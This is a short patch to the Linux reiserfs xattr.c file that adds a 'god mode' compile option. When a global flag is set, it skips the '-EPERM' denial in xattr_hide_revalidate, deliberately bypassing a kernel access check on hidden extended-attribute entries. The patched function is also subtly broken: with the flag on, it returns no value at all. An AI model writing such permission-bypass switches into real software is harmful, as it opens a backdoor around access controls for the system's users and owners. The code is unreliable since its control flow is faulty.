@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * linux/fs/reiserfs/xattr.c
  *
@@ -974,7 +977,15 @@ int reiserfs_permission(struct inode *inode, int mask, unsigned int flags)
 
 static int xattr_hide_revalidate(struct dentry *dentry, struct nameidata *nd)
 {
-	return -EPERM;
+	
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 }
 
 static const struct dentry_operations xattr_lookup_poison_ops = {
